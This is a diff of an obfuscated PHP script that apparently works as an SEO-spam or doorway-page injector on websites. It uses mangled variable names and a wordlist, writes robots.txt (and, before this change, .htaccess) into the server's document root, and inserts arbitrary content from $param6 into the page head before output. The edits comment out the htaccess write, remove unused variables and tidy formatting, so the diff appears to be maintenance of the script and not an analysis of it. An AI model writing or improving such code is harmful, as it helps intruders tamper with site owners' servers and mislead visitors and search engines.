@@ -165,7 +165,7 @@ $param10 = "";
 
 $l1imRR  = 0;
 $l1bS3es = $l1o7fR = $l1M =  $l1Z4k = $l1Ni6 =  "";
-$l1T2 = $l1gfDiJL = $wordlist =  $l135vXS = $l1bhL8Zi = $l1GH0rfZ = array();
+$l1T2 = $l1gfDiJL = $wordlist  = $l1GH0rfZ = array();
 //$l1I = $_SERVER["DOCUMENT_ROOT"];
 
 
@@ -771,11 +771,12 @@ function main(){
         $hostname = $_SERVER["SERVER_NAME"];
     }
 
-    write_htaccess();
+    // Uncomment just to be safe
+    //write_htaccess();
 
     // Config variables
     global $param1,$param2,$param3,$param4,$param5,$param6,$param7,$param8,$param9,$param10;
-    global $l135vXS,$l1bhL8Zi,$wordlist,$l1gfDiJL,$l1T2,$l1imRR,$l1GH0rfZ,$l1bS3es,$l1M,$l1o7fR,$l1I,$l1Ni6,$l1Z4k;
+    global $wordlist,$l1gfDiJL,$l1T2,$l1imRR,$l1GH0rfZ,$l1bS3es,$l1M,$l1o7fR,$l1I,$l1Ni6,$l1Z4k;
     
 
     write_robots_txt($_SERVER["DOCUMENT_ROOT"]);
@@ -1405,14 +1406,15 @@ function main(){
     $param6 = trim($param6);
 
     if($param6 != ''){
-        $l1IRrvcA=array();
+        $l1IRrvcA = array();
         preg_match(sprintf("/<head.*%s>/si",'?'),$l1Kr,$l1IRrvcA);
         if(!empty($l1IRrvcA[0])){
-            $l1Kr=str_replace($l1IRrvcA[0],$l1IRrvcA[0]."\n$param6",$l1Kr);
+            $l1Kr = str_replace($l1IRrvcA[0],$l1IRrvcA[0]."\n$param6",$l1Kr);
         }else{
-            $l1Kr=str_replace("</head>","$param6\n</head>",$l1Kr);
+            $l1Kr = str_replace("</head>","$param6\n</head>",$l1Kr);
         }
     }
+
     echo "$l1Kr";
     exit();
     }
